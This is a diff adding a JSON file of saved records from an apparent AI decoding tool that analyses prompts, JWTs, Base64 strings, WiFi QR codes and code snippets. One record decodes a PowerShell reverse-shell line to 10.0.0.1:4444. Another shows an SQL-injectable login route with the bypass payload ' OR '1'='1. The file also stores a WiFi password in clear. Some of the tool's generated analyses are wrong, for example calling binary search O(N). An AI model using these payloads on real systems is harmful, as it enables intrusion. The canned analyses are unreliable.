@@ -1,0 +1,796 @@
+[
+  {
+    "id": "91f439bb-a07e-48f4-be82-ed2566e64e53",
+    "_id": "91f439bb-a07e-48f4-be82-ed2566e64e53",
+    "isBookmarked": false,
+    "tags": [],
+    "createdAt": "2026-11-24T18:08:23.296Z",
+    "updatedAt": "2026-11-24T18:08:23.296Z",
+    "userId": null,
+    "decoderType": "prompt",
+    "rawInput": "Write a python script that cleans a dataset and outputs json. Do not crash.",
+    "decodedOutput": "You are an expert AI system specialized in high-precision execution.\n\n[OBJECTIVE]\nWrite a python script that cleans a dataset and outputs json. Do not crash.\n\n[CONSTRAINTS]\n1. Respond concisely and avoid generic preamble.\n2. If uncertain about specific parameters, explicitly state assumptions.\n3. Adhere strictly to the requested schema.\n\n[OUTPUT FORMAT]\nStructured Markdown with clear headings and bullet points.",
+    "aiExplanation": {
+      "summary": "Prompt analyzed: 14 words. Overall health score: 83/100. Key strengths and optimizations identified.",
+      "scores": {
+        "overall": 83,
+        "clarity": 75,
+        "constraints": 85,
+        "structure": 90,
+        "tokenEfficiency": 82
+      },
+      "critique": {
+        "strengths": [
+          "Clear core objective stated.",
+          "Includes desired output formatting."
+        ],
+        "weaknesses": [
+          "Constraints could be more defensively bounded.",
+          "Ambiguous edge cases not explicitly handled."
+        ],
+        "antiPatternsDetected": [
+          "Missing System Persona Anchor"
+        ]
+      },
+      "optimizedVersions": {
+        "standardProduction": "You are an expert AI system specialized in high-precision execution.\n\n[OBJECTIVE]\nWrite a python script that cleans a dataset and outputs json. Do not crash.\n\n[CONSTRAINTS]\n1. Respond concisely and avoid generic preamble.\n2. If uncertain about specific parameters, explicitly state assumptions.\n3. Adhere strictly to the requested schema.\n\n[OUTPUT FORMAT]\nStructured Markdown with clear headings and bullet points.",
+        "chainOfThought": "You are an elite reasoning model.\nAnalyze the following directive step-by-step before answering.\n\n[TASK DIRECTIVE]\nWrite a python script that cleans a dataset and outputs json. Do not crash.\n\n[REASONING PROTOCOL]\n1. Break down the core intent and identify potential ambiguities.\n2. Formulate the optimal execution strategy.\n3. Validate each step against potential edge cases.\n\n[FINAL DELIVERABLE]\nProvide the direct, high-impact solution following the verified plan.",
+        "fewShotSchema": "You are a deterministic AI engine.\n\n<context>\nTarget task: Write a python script that cleans a dataset and outputs json. Do not crash.\n</context>\n\n<rules>\n- Do not add conversational filler.\n- Always validate outputs against strict formatting standards.\n</rules>\n\n<output_schema>\n{\n  \"status\": \"success\",\n  \"result\": \"<direct_answer>\",\n  \"metadata\": { \"confidence\": 0.98 }\n}\n</output_schema>"
+      },
+      "breakdown": [
+        "Word count: 14 | Estimated tokens: 20",
+        "Persona Anchor: Missing (Recommended)",
+        "Schema Determinism: Enforced"
+      ],
+      "securityAudit": "PASS: Prompt clean. No prompt injection or recursive jailbreak patterns identified.",
+      "complexity": "Difficulty: Moderate | Optimization Gain: +17%",
+      "detectedFormat": "Instruction Prompt"
+    },
+    "metadata": {
+      "language": "GPT-4o / Claude 3.5",
+      "executionTimeMs": 0
+    }
+  },
+  {
+    "id": "1109333a-6ec9-43b5-aa97-04a275cb116c",
+    "_id": "1109333a-6ec9-43b5-aa97-04a275cb116c",
+    "isBookmarked": false,
+    "tags": [],
+    "createdAt": "2026-11-24T18:08:23.290Z",
+    "updatedAt": "2026-11-24T18:08:23.290Z",
+    "userId": null,
+    "decoderType": "jwt",
+    "rawInput": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ.sig",
+    "decodedOutput": "{\n  \"header\": {\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\"\n  },\n  \"payload\": {\n    \"sub\": \"123456\",\n    \"role\": \"guest\"\n  },\n  \"status\": {\n    \"isExpired\": false,\n    \"expiresAt\": \"None\",\n    \"algorithm\": \"HS256\"\n  }\n}",
+    "aiExplanation": {
+      "summary": "Decoded semantic contents. The input represents an encoded cryptographic or serialized structure.",
+      "breakdown": [
+        "Input length: 83 characters | Output length: 212 characters.",
+        "Semantic structure translated into plain, readable conversational English.",
+        "Identified key concepts and stripped extraneous protocol markers."
+      ],
+      "securityAudit": "CLEAN: No injection or exploit payload patterns identified.",
+      "complexity": "Entropy Level: Low-to-Medium",
+      "detectedFormat": "JSON Web Token (JWT)"
+    },
+    "metadata": {
+      "language": "jwt",
+      "executionTimeMs": 1
+    }
+  },
+  {
+    "id": "d1514782-72a9-4c57-8270-deba55451bf8",
+    "_id": "d1514782-72a9-4c57-8270-deba55451bf8",
+    "isBookmarked": true,
+    "tags": [],
+    "createdAt": "2026-11-24T18:08:23.285Z",
+    "updatedAt": "2026-11-24T18:08:23.316Z",
+    "userId": "de6f63dc-5057-4ad7-903f-0ad5856f6fc1",
+    "decoderType": "code",
+    "rawInput": "function binarySearch(arr, x) { let l = 0, r = arr.length - 1; while (l <= r) { let m = Math.floor((l + r) / 2); if (arr[m] === x) return m; if (arr[m] < x) l = m + 1; else r = m - 1; } return -1; }",
+    "decodedOutput": "Analyzed javascript block: executes algorithmic logic with structured boundary checking.",
+    "aiExplanation": {
+      "summary": "Analyzed javascript block: executes algorithmic logic with structured boundary checking.",
+      "breakdown": [
+        "Identified paradigm: JAVASCRIPT.",
+        "Variable scoping and condition trees evaluate safely without unhandled exceptions.",
+        "Algorithmic complexity conforms to standard asymptotic limits."
+      ],
+      "securityAudit": "SECURE: No OWASP Top-10 or common memory unsafety signatures detected.",
+      "complexity": "Time Complexity: ~O(N) | Space Complexity: ~O(1)",
+      "detectedFormat": "JAVASCRIPT Source"
+    },
+    "metadata": {
+      "language": "javascript",
+      "executionTimeMs": 0
+    }
+  },
+  {
+    "id": "2010dde8-ff86-418d-b85c-b5f5f2be356e",
+    "_id": "2010dde8-ff86-418d-b85c-b5f5f2be356e",
+    "isBookmarked": false,
+    "tags": [],
+    "createdAt": "2026-11-24T18:08:23.278Z",
+    "updatedAt": "2026-11-24T18:08:23.278Z",
+    "userId": "de6f63dc-5057-4ad7-903f-0ad5856f6fc1",
+    "decoderType": "text",
+    "rawInput": "VGhpcyBpcyBhbiBhZHZhbmNlZCBjeWJlciBkZWNvZGUgdGVzdA==",
+    "decodedOutput": "This is an advanced cyber decode test",
+    "aiExplanation": {
+      "summary": "Decoded semantic contents. The input represents an encoded cryptographic or serialized structure.",
+      "breakdown": [
+        "Input length: 52 characters | Output length: 37 characters.",
+        "Semantic structure translated into plain, readable conversational English.",
+        "Identified key concepts and stripped extraneous protocol markers."
+      ],
+      "securityAudit": "CLEAN: No injection or exploit payload patterns identified.",
+      "complexity": "Entropy Level: Low-to-Medium",
+      "detectedFormat": "Standard Text String"
+    },
+    "metadata": {
+      "language": "text",
+      "executionTimeMs": 0
+    }
+  },
+  {
+    "id": "834151bf-af11-4367-a028-39c38ed9795d",
+    "_id": "834151bf-af11-4367-a028-39c38ed9795d",
+    "isBookmarked": false,
+    "tags": [],
+    "createdAt": "2026-11-24T17:58:34.400Z",
+    "updatedAt": "2026-11-24T17:58:34.400Z",
+    "userId": null,
+    "decoderType": "prompt",
+    "rawInput": "Write a python script that cleans a dataset and outputs json. Do not crash.",
+    "decodedOutput": "You are an expert AI system specialized in high-precision execution.\n\n[OBJECTIVE]\nWrite a python script that cleans a dataset and outputs json. Do not crash.\n\n[CONSTRAINTS]\n1. Respond concisely and avoid generic preamble.\n2. If uncertain about specific parameters, explicitly state assumptions.\n3. Adhere strictly to the requested schema.\n\n[OUTPUT FORMAT]\nStructured Markdown with clear headings and bullet points.",
+    "aiExplanation": {
+      "summary": "Prompt analyzed: 14 words. Overall health score: 83/100. Key strengths and optimizations identified.",
+      "scores": {
+        "overall": 83,
+        "clarity": 75,
+        "constraints": 85,
+        "structure": 90,
+        "tokenEfficiency": 82
+      },
+      "critique": {
+        "strengths": [
+          "Clear core objective stated.",
+          "Includes desired output formatting."
+        ],
+        "weaknesses": [
+          "Constraints could be more defensively bounded.",
+          "Ambiguous edge cases not explicitly handled."
+        ],
+        "antiPatternsDetected": [
+          "Missing System Persona Anchor"
+        ]
+      },
+      "optimizedVersions": {
+        "standardProduction": "You are an expert AI system specialized in high-precision execution.\n\n[OBJECTIVE]\nWrite a python script that cleans a dataset and outputs json. Do not crash.\n\n[CONSTRAINTS]\n1. Respond concisely and avoid generic preamble.\n2. If uncertain about specific parameters, explicitly state assumptions.\n3. Adhere strictly to the requested schema.\n\n[OUTPUT FORMAT]\nStructured Markdown with clear headings and bullet points.",
+        "chainOfThought": "You are an elite reasoning model.\nAnalyze the following directive step-by-step before answering.\n\n[TASK DIRECTIVE]\nWrite a python script that cleans a dataset and outputs json. Do not crash.\n\n[REASONING PROTOCOL]\n1. Break down the core intent and identify potential ambiguities.\n2. Formulate the optimal execution strategy.\n3. Validate each step against potential edge cases.\n\n[FINAL DELIVERABLE]\nProvide the direct, high-impact solution following the verified plan.",
+        "fewShotSchema": "You are a deterministic AI engine.\n\n<context>\nTarget task: Write a python script that cleans a dataset and outputs json. Do not crash.\n</context>\n\n<rules>\n- Do not add conversational filler.\n- Always validate outputs against strict formatting standards.\n</rules>\n\n<output_schema>\n{\n  \"status\": \"success\",\n  \"result\": \"<direct_answer>\",\n  \"metadata\": { \"confidence\": 0.98 }\n}\n</output_schema>"
+      },
+      "breakdown": [
+        "Word count: 14 | Estimated tokens: 20",
+        "Persona Anchor: Missing (Recommended)",
+        "Schema Determinism: Enforced"
+      ],
+      "securityAudit": "PASS: Prompt clean. No prompt injection or recursive jailbreak patterns identified.",
+      "complexity": "Difficulty: Moderate | Optimization Gain: +17%",
+      "detectedFormat": "Instruction Prompt"
+    },
+    "metadata": {
+      "language": "GPT-4o / Claude 3.5",
+      "executionTimeMs": 0
+    }
+  },
+  {
+    "id": "8455dfdc-3dd1-4a0c-ae24-515e31070229",
+    "_id": "8455dfdc-3dd1-4a0c-ae24-515e31070229",
+    "isBookmarked": false,
+    "tags": [],
+    "createdAt": "2026-11-24T17:58:34.395Z",
+    "updatedAt": "2026-11-24T17:58:34.395Z",
+    "userId": null,
+    "decoderType": "jwt",
+    "rawInput": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ.sig",
+    "decodedOutput": "{\n  \"header\": {\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\"\n  },\n  \"payload\": {\n    \"sub\": \"123456\",\n    \"role\": \"guest\"\n  },\n  \"status\": {\n    \"isExpired\": false,\n    \"expiresAt\": \"None\",\n    \"algorithm\": \"HS256\"\n  }\n}",
+    "aiExplanation": {
+      "summary": "Decoded semantic contents. The input represents an encoded cryptographic or serialized structure.",
+      "breakdown": [
+        "Input length: 83 characters | Output length: 212 characters.",
+        "Semantic structure translated into plain, readable conversational English.",
+        "Identified key concepts and stripped extraneous protocol markers."
+      ],
+      "securityAudit": "CLEAN: No injection or exploit payload patterns identified.",
+      "complexity": "Entropy Level: Low-to-Medium",
+      "detectedFormat": "JSON Web Token (JWT)"
+    },
+    "metadata": {
+      "language": "jwt",
+      "executionTimeMs": 0
+    }
+  },
+  {
+    "id": "cc3f8400-9356-40a4-87f9-304ab7dca5fc",
+    "_id": "cc3f8400-9356-40a4-87f9-304ab7dca5fc",
+    "isBookmarked": true,
+    "tags": [],
+    "createdAt": "2026-11-24T17:58:34.386Z",
+    "updatedAt": "2026-11-24T17:58:34.431Z",
+    "userId": "de6f63dc-5057-4ad7-903f-0ad5856f6fc1",
+    "decoderType": "code",
+    "rawInput": "function binarySearch(arr, x) { let l = 0, r = arr.length - 1; while (l <= r) { let m = Math.floor((l + r) / 2); if (arr[m] === x) return m; if (arr[m] < x) l = m + 1; else r = m - 1; } return -1; }",
+    "decodedOutput": "Analyzed javascript block: executes algorithmic logic with structured boundary checking.",
+    "aiExplanation": {
+      "summary": "Analyzed javascript block: executes algorithmic logic with structured boundary checking.",
+      "breakdown": [
+        "Identified paradigm: JAVASCRIPT.",
+        "Variable scoping and condition trees evaluate safely without unhandled exceptions.",
+        "Algorithmic complexity conforms to standard asymptotic limits."
+      ],
+      "securityAudit": "SECURE: No OWASP Top-10 or common memory unsafety signatures detected.",
+      "complexity": "Time Complexity: ~O(N) | Space Complexity: ~O(1)",
+      "detectedFormat": "JAVASCRIPT Source"
+    },
+    "metadata": {
+      "language": "javascript",
+      "executionTimeMs": 0
+    }
+  },
+  {
+    "id": "b37a82aa-93e7-41f3-af15-1d715b2620ef",
+    "_id": "b37a82aa-93e7-41f3-af15-1d715b2620ef",
+    "isBookmarked": false,
+    "tags": [],
+    "createdAt": "2026-11-24T17:58:34.380Z",
+    "updatedAt": "2026-11-24T17:58:34.380Z",
+    "userId": "de6f63dc-5057-4ad7-903f-0ad5856f6fc1",
+    "decoderType": "text",
+    "rawInput": "VGhpcyBpcyBhbiBhZHZhbmNlZCBjeWJlciBkZWNvZGUgdGVzdA==",
+    "decodedOutput": "This is an advanced cyber decode test",
+    "aiExplanation": {
+      "summary": "Decoded semantic contents. The input represents an encoded cryptographic or serialized structure.",
+      "breakdown": [
+        "Input length: 52 characters | Output length: 37 characters.",
+        "Semantic structure translated into plain, readable conversational English.",
+        "Identified key concepts and stripped extraneous protocol markers."
+      ],
+      "securityAudit": "CLEAN: No injection or exploit payload patterns identified.",
+      "complexity": "Entropy Level: Low-to-Medium",
+      "detectedFormat": "Standard Text String"
+    },
+    "metadata": {
+      "language": "text",
+      "executionTimeMs": 1
+    }
+  },
+  {
+    "id": "e04a39b0-4604-4376-bc4f-61f18ca30108",
+    "_id": "e04a39b0-4604-4376-bc4f-61f18ca30108",
+    "isBookmarked": false,
+    "tags": [
+      "prompt-engineering",
+      "optimizer"
+    ],
+    "createdAt": "2026-11-24T17:57:36.076Z",
+    "updatedAt": "2026-11-24T17:57:36.076Z",
+    "decoderType": "prompt",
+    "rawInput": "Build an API in node that decodes strings and answers questions.",
+    "decodedOutput": "You are an elite backend architect.\n[OBJECTIVE]\nBuild a production-grade Node.js / Express REST API with modular routing, input validation, and AI decoding integration.\n\n[CONSTRAINTS]\n1. Use ES Modules syntax.\n2. Implement centralized error handling and structured JSON output.\n3. Adhere to OWASP security guidelines.",
+    "aiExplanation": {
+      "summary": "Vague instruction prompt transformed into structured enterprise technical directive.",
+      "scores": {
+        "overall": 94,
+        "clarity": 95,
+        "constraints": 90,
+        "structure": 95,
+        "tokenEfficiency": 92
+      },
+      "critique": {
+        "strengths": [
+          "Identifies core programming language."
+        ],
+        "weaknesses": [
+          "Missing error handling criteria",
+          "Unbounded output format"
+        ]
+      },
+      "securityAudit": "SECURE: Prompt sanitized.",
+      "complexity": "Optimization Gain: +40% Precision",
+      "detectedFormat": "Optimized System Prompt"
+    },
+    "metadata": {
+      "language": "prompt",
+      "executionTimeMs": 18
+    }
+  },
+  {
+    "id": "ba5671ed-396e-49cc-bb05-2f1d5d407a79",
+    "_id": "ba5671ed-396e-49cc-bb05-2f1d5d407a79",
+    "isBookmarked": true,
+    "tags": [
+      "wifi",
+      "qr",
+      "network"
+    ],
+    "createdAt": "2026-11-24T17:57:36.072Z",
+    "updatedAt": "2026-11-24T17:57:36.072Z",
+    "decoderType": "qr",
+    "rawInput": "WIFI:T:WPA2;S:Antigravity_Research_Lab;P:N3ur4l_D3c0d3r_2026!;;",
+    "decodedOutput": "WIFI:T:WPA2;S:Antigravity_Research_Lab;P:N3ur4l_D3c0d3r_2026!;;",
+    "aiExplanation": {
+      "summary": "Wireless network configuration beacon for Antigravity_Research_Lab.",
+      "breakdown": [
+        "SSID: Antigravity_Research_Lab",
+        "Authentication Protocol: WPA2-Personal",
+        "High-entropy passphrase verified with alphanumeric and special characters."
+      ],
+      "securityAudit": "SAFE: Standard WiFi connection configuration string.",
+      "complexity": "Level 1 Direct QR Payload",
+      "detectedFormat": "WiFi Configuration URI"
+    },
+    "metadata": {
+      "language": "qr",
+      "executionTimeMs": 8
+    }
+  },
+  {
+    "id": "2866b4fc-fe2f-4f67-8a8f-c1fbc91b1176",
+    "_id": "2866b4fc-fe2f-4f67-8a8f-c1fbc91b1176",
+    "isBookmarked": false,
+    "tags": [
+      "jwt",
+      "auth",
+      "tokens"
+    ],
+    "createdAt": "2026-11-24T17:57:36.070Z",
+    "updatedAt": "2026-11-24T17:57:36.070Z",
+    "decoderType": "jwt",
+    "rawInput": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJvcGVyYXRvcl8wMDciLCJyb2xlIjoiYWRtaW4iLCJpc3MiOiJhaS1kZWNvZGVyLW5vZGUiLCJleHAiOjE3ODQ4NTY5OTl9.signature_hash_preview",
+    "decodedOutput": "{\n  \"header\": {\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\"\n  },\n  \"payload\": {\n    \"sub\": \"operator_007\",\n    \"role\": \"admin\",\n    \"iss\": \"ai-decoder-node\",\n    \"exp\": 1784856999\n  },\n  \"status\": {\n    \"isExpired\": false,\n    \"algorithm\": \"HS256\"\n  }\n}",
+    "aiExplanation": {
+      "summary": "Cryptographic JSON Web Token issuing administrative credentials to operator_007.",
+      "breakdown": [
+        "Signed using HMAC-SHA256 (HS256) symmetric algorithm.",
+        "Carries administrative role privileges with extended validity period.",
+        "Payload claims adhere to RFC 7519 standards."
+      ],
+      "securityAudit": "SECURE: Valid claims structure. Ensure HS256 secret key entropy is > 256 bits.",
+      "complexity": "RFC 7519 Compliant Token",
+      "detectedFormat": "JSON Web Token (JWT)"
+    },
+    "metadata": {
+      "language": "jwt",
+      "executionTimeMs": 3
+    }
+  },
+  {
+    "id": "32a1b9c5-755a-4627-b0c3-3174b6eb2aa1",
+    "_id": "32a1b9c5-755a-4627-b0c3-3174b6eb2aa1",
+    "isBookmarked": true,
+    "tags": [
+      "cwe-89",
+      "owasp",
+      "vulnerability"
+    ],
+    "createdAt": "2026-11-24T17:57:36.067Z",
+    "updatedAt": "2026-11-24T17:57:36.067Z",
+    "decoderType": "code",
+    "rawInput": "app.post('/api/authenticate', async (req, res) => {\n  const { user, pass } = req.body;\n  const sql = \"SELECT * FROM operators WHERE username = '\" + user + \"' AND password = '\" + pass + \"'\";\n  const result = await db.query(sql);\n  res.json(result);\n});",
+    "decodedOutput": "Express.js authentication route vulnerable to CWE-89 SQL Injection via unparameterized string concatenation.",
+    "aiExplanation": {
+      "summary": "Express.js authentication handler with critical SQL Injection vulnerability.",
+      "breakdown": [
+        "Direct string concatenation of user and pass variables into raw SQL query.",
+        "Allows authentication bypass using payload: ' OR '1'='1.",
+        "Remediation: Use parameterized queries or ORM bindings (e.g. SELECT * FROM operators WHERE username = ?)."
+      ],
+      "securityAudit": "VULNERABILITY: CWE-89 SQL Injection (OWASP Top 10 - A03:2021).",
+      "complexity": "Time Complexity: O(1) query dispatch | Space: O(1)",
+      "detectedFormat": "Node.js Express Handler"
+    },
+    "metadata": {
+      "language": "javascript",
+      "executionTimeMs": 22
+    }
+  },
+  {
+    "id": "c979e0ef-ec06-4a27-8a8f-2f749935d3db",
+    "_id": "c979e0ef-ec06-4a27-8a8f-2f749935d3db",
+    "isBookmarked": true,
+    "tags": [
+      "security",
+      "malware",
+      "powershell"
+    ],
+    "createdAt": "2026-11-24T17:57:36.065Z",
+    "updatedAt": "2026-11-24T17:57:36.065Z",
+    "decoderType": "text",
+    "rawInput": "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxACIALAA0ADQANAA0ACkAOwA=",
+    "decodedOutput": "$client = New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4444);",
+    "aiExplanation": {
+      "summary": "Decoded Base64 Unicode payload revealing a PowerShell reverse TCP shell connection.",
+      "breakdown": [
+        "Instantiates a .NET TCPClient object targeting IP 10.0.0.1 on port 4444.",
+        "Standard reverse-shell initiation signature commonly observed in red-team exercises.",
+        "Obfuscated using UTF-16LE encoding."
+      ],
+      "securityAudit": "CRITICAL THREAT: Unauthorized reverse-shell network beacon.",
+      "complexity": "Entropy Level: High (Obfuscated Base64 PowerShell)",
+      "detectedFormat": "PowerShell Reverse Shell Script"
+    },
+    "metadata": {
+      "language": "powershell",
+      "executionTimeMs": 14
+    }
+  },
+  {
+    "id": "b2ae2fc4-e74a-403d-8900-43f652cc165d",
+    "_id": "b2ae2fc4-e74a-403d-8900-43f652cc165d",
+    "isBookmarked": false,
+    "tags": [],
+    "createdAt": "2026-11-24T17:41:18.502Z",
+    "updatedAt": "2026-11-24T17:41:18.502Z",
+    "userId": null,
+    "decoderType": "prompt",
+    "rawInput": "Write a python script that cleans a dataset and outputs json. Do not crash.",
+    "decodedOutput": "You are an expert AI system specialized in high-precision execution.\n\n[OBJECTIVE]\nWrite a python script that cleans a dataset and outputs json. Do not crash.\n\n[CONSTRAINTS]\n1. Respond concisely and avoid generic preamble.\n2. If uncertain about specific parameters, explicitly state assumptions.\n3. Adhere strictly to the requested schema.\n\n[OUTPUT FORMAT]\nStructured Markdown with clear headings and bullet points.",
+    "aiExplanation": {
+      "summary": "Prompt analyzed: 14 words. Overall health score: 83/100. Key strengths and optimizations identified.",
+      "scores": {
+        "overall": 83,
+        "clarity": 75,
+        "constraints": 85,
+        "structure": 90,
+        "tokenEfficiency": 82
+      },
+      "critique": {
+        "strengths": [
+          "Clear core objective stated.",
+          "Includes desired output formatting."
+        ],
+        "weaknesses": [
+          "Constraints could be more defensively bounded.",
+          "Ambiguous edge cases not explicitly handled."
+        ],
+        "antiPatternsDetected": [
+          "Missing System Persona Anchor"
+        ]
+      },
+      "optimizedVersions": {
+        "standardProduction": "You are an expert AI system specialized in high-precision execution.\n\n[OBJECTIVE]\nWrite a python script that cleans a dataset and outputs json. Do not crash.\n\n[CONSTRAINTS]\n1. Respond concisely and avoid generic preamble.\n2. If uncertain about specific parameters, explicitly state assumptions.\n3. Adhere strictly to the requested schema.\n\n[OUTPUT FORMAT]\nStructured Markdown with clear headings and bullet points.",
+        "chainOfThought": "You are an elite reasoning model.\nAnalyze the following directive step-by-step before answering.\n\n[TASK DIRECTIVE]\nWrite a python script that cleans a dataset and outputs json. Do not crash.\n\n[REASONING PROTOCOL]\n1. Break down the core intent and identify potential ambiguities.\n2. Formulate the optimal execution strategy.\n3. Validate each step against potential edge cases.\n\n[FINAL DELIVERABLE]\nProvide the direct, high-impact solution following the verified plan.",
+        "fewShotSchema": "You are a deterministic AI engine.\n\n<context>\nTarget task: Write a python script that cleans a dataset and outputs json. Do not crash.\n</context>\n\n<rules>\n- Do not add conversational filler.\n- Always validate outputs against strict formatting standards.\n</rules>\n\n<output_schema>\n{\n  \"status\": \"success\",\n  \"result\": \"<direct_answer>\",\n  \"metadata\": { \"confidence\": 0.98 }\n}\n</output_schema>"
+      },
+      "breakdown": [
+        "Word count: 14 | Estimated tokens: 20",
+        "Persona Anchor: Missing (Recommended)",
+        "Schema Determinism: Enforced"
+      ],
+      "securityAudit": "PASS: Prompt clean. No prompt injection or recursive jailbreak patterns identified.",
+      "complexity": "Difficulty: Moderate | Optimization Gain: +17%",
+      "detectedFormat": "Instruction Prompt"
+    },
+    "metadata": {
+      "language": "GPT-4o / Claude 3.5",
+      "executionTimeMs": 1
+    }
+  },
+  {
+    "id": "cf7d2101-6f24-4612-8cd5-958fb2b1d416",
+    "_id": "cf7d2101-6f24-4612-8cd5-958fb2b1d416",
+    "isBookmarked": false,
+    "tags": [],
+    "createdAt": "2026-11-24T17:41:18.496Z",
+    "updatedAt": "2026-11-24T17:41:18.496Z",
+    "userId": null,
+    "decoderType": "jwt",
+    "rawInput": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ.sig",
+    "decodedOutput": "{\n  \"header\": {\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\"\n  },\n  \"payload\": {\n    \"sub\": \"123456\",\n    \"role\": \"guest\"\n  },\n  \"status\": {\n    \"isExpired\": false,\n    \"expiresAt\": \"None\",\n    \"algorithm\": \"HS256\"\n  }\n}",
+    "aiExplanation": {
+      "summary": "Decoded semantic contents. The input represents an encoded cryptographic or serialized structure.",
+      "breakdown": [
+        "Input length: 83 characters | Output length: 212 characters.",
+        "Semantic structure translated into plain, readable conversational English.",
+        "Identified key concepts and stripped extraneous protocol markers."
+      ],
+      "securityAudit": "CLEAN: No injection or exploit payload patterns identified.",
+      "complexity": "Entropy Level: Low-to-Medium",
+      "detectedFormat": "JSON Web Token (JWT)"
+    },
+    "metadata": {
+      "language": "jwt",
+      "executionTimeMs": 0
+    }
+  },
+  {
+    "id": "57b9d0e4-9c89-4f84-9863-fe76aa092567",
+    "_id": "57b9d0e4-9c89-4f84-9863-fe76aa092567",
+    "isBookmarked": true,
+    "tags": [],
+    "createdAt": "2026-11-24T17:41:18.488Z",
+    "updatedAt": "2026-11-24T17:41:18.525Z",
+    "userId": "de6f63dc-5057-4ad7-903f-0ad5856f6fc1",
+    "decoderType": "code",
+    "rawInput": "function binarySearch(arr, x) { let l = 0, r = arr.length - 1; while (l <= r) { let m = Math.floor((l + r) / 2); if (arr[m] === x) return m; if (arr[m] < x) l = m + 1; else r = m - 1; } return -1; }",
+    "decodedOutput": "Analyzed javascript block: executes algorithmic logic with structured boundary checking.",
+    "aiExplanation": {
+      "summary": "Analyzed javascript block: executes algorithmic logic with structured boundary checking.",
+      "breakdown": [
+        "Identified paradigm: JAVASCRIPT.",
+        "Variable scoping and condition trees evaluate safely without unhandled exceptions.",
+        "Algorithmic complexity conforms to standard asymptotic limits."
+      ],
+      "securityAudit": "SECURE: No OWASP Top-10 or common memory unsafety signatures detected.",
+      "complexity": "Time Complexity: ~O(N) | Space Complexity: ~O(1)",
+      "detectedFormat": "JAVASCRIPT Source"
+    },
+    "metadata": {
+      "language": "javascript",
+      "executionTimeMs": 0
+    }
+  },
+  {
+    "id": "4a2685a2-2303-4a53-ac51-e9d2fc57d048",
+    "_id": "4a2685a2-2303-4a53-ac51-e9d2fc57d048",
+    "isBookmarked": false,
+    "tags": [],
+    "createdAt": "2026-11-24T17:41:18.483Z",
+    "updatedAt": "2026-11-24T17:41:18.483Z",
+    "userId": "de6f63dc-5057-4ad7-903f-0ad5856f6fc1",
+    "decoderType": "text",
+    "rawInput": "VGhpcyBpcyBhbiBhZHZhbmNlZCBjeWJlciBkZWNvZGUgdGVzdA==",
+    "decodedOutput": "This is an advanced cyber decode test",
+    "aiExplanation": {
+      "summary": "Decoded semantic contents. The input represents an encoded cryptographic or serialized structure.",
+      "breakdown": [
+        "Input length: 52 characters | Output length: 37 characters.",
+        "Semantic structure translated into plain, readable conversational English.",
+        "Identified key concepts and stripped extraneous protocol markers."
+      ],
+      "securityAudit": "CLEAN: No injection or exploit payload patterns identified.",
+      "complexity": "Entropy Level: Low-to-Medium",
+      "detectedFormat": "Standard Text String"
+    },
+    "metadata": {
+      "language": "text",
+      "executionTimeMs": 0
+    }
+  },
+  {
+    "id": "97527b27-980a-4432-9f57-627310cd46ab",
+    "_id": "97527b27-980a-4432-9f57-627310cd46ab",
+    "isBookmarked": false,
+    "tags": [
+      "prompt-engineering",
+      "optimizer"
+    ],
+    "createdAt": "2026-11-24T17:40:10.883Z",
+    "updatedAt": "2026-11-24T17:40:10.883Z",
+    "decoderType": "prompt",
+    "rawInput": "Build an API in node that decodes strings and answers questions.",
+    "decodedOutput": "You are an elite backend architect.\n[OBJECTIVE]\nBuild a production-grade Node.js / Express REST API with modular routing, input validation, and AI decoding integration.\n\n[CONSTRAINTS]\n1. Use ES Modules syntax.\n2. Implement centralized error handling and structured JSON output.\n3. Adhere to OWASP security guidelines.",
+    "aiExplanation": {
+      "summary": "Vague instruction prompt transformed into structured enterprise technical directive.",
+      "scores": {
+        "overall": 94,
+        "clarity": 95,
+        "constraints": 90,
+        "structure": 95,
+        "tokenEfficiency": 92
+      },
+      "critique": {
+        "strengths": [
+          "Identifies core programming language."
+        ],
+        "weaknesses": [
+          "Missing error handling criteria",
+          "Unbounded output format"
+        ]
+      },
+      "securityAudit": "SECURE: Prompt sanitized.",
+      "complexity": "Optimization Gain: +40% Precision",
+      "detectedFormat": "Optimized System Prompt"
+    },
+    "metadata": {
+      "language": "prompt",
+      "executionTimeMs": 18
+    }
+  },
+  {
+    "id": "96ae913f-9c16-4c50-8c6c-4fc499dd8b82",
+    "_id": "96ae913f-9c16-4c50-8c6c-4fc499dd8b82",
+    "isBookmarked": true,
+    "tags": [
+      "wifi",
+      "qr",
+      "network"
+    ],
+    "createdAt": "2026-11-24T17:40:10.881Z",
+    "updatedAt": "2026-11-24T17:40:10.881Z",
+    "decoderType": "qr",
+    "rawInput": "WIFI:T:WPA2;S:Antigravity_Research_Lab;P:N3ur4l_D3c0d3r_2026!;;",
+    "decodedOutput": "WIFI:T:WPA2;S:Antigravity_Research_Lab;P:N3ur4l_D3c0d3r_2026!;;",
+    "aiExplanation": {
+      "summary": "Wireless network configuration beacon for Antigravity_Research_Lab.",
+      "breakdown": [
+        "SSID: Antigravity_Research_Lab",
+        "Authentication Protocol: WPA2-Personal",
+        "High-entropy passphrase verified with alphanumeric and special characters."
+      ],
+      "securityAudit": "SAFE: Standard WiFi connection configuration string.",
+      "complexity": "Level 1 Direct QR Payload",
+      "detectedFormat": "WiFi Configuration URI"
+    },
+    "metadata": {
+      "language": "qr",
+      "executionTimeMs": 8
+    }
+  },
+  {
+    "id": "01d0596e-b7cc-4022-a88f-c5553050977d",
+    "_id": "01d0596e-b7cc-4022-a88f-c5553050977d",
